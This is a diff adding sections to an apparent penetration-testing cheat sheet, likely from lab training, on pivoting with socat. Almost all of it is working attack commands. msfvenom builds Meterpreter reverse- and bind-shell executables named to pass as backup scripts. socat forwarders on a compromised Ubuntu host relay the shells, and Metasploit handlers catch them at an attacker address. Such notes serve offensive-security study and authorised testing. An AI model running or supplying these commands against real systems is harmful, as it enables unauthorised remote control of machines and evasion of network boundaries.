@@ -1159,6 +1159,40 @@ msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
 # Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
 # Establishing the Meterpreter session
 meterpreter > shell
+
+```
+##### Socat Redirection with a Reverse Shell
+```
+# We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu(pivot) server.
+# Starting Socat Listener on a Ubuntu(pivot) server.
+ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+
+# Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). 
+# Creating the Windows Payload from our attack host
+sword0x00@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+
+# Configuring & Starting the multi/handler on our attack host
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 0.0.0.0
+set lport 80
+ run
+```
+##### Socat Redirection with a Bind Shell
+```
+# We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.
+# Creating the Windows Payload
+msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
+
+# Starting Socat Bind Shell Listeneron a Ubuntu(pivot) server.
+ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+
+# Configuring & Starting the Bind multi/handler on our attacker host
+use exploit/multi/handler
+set payload windows/x64/meterpreter/bind_tcp
+set RHOST 10.129.202.64
+set LPORT 8080
+run
 ```
 ## Attacking Common Services
 ##### Attacking FTP
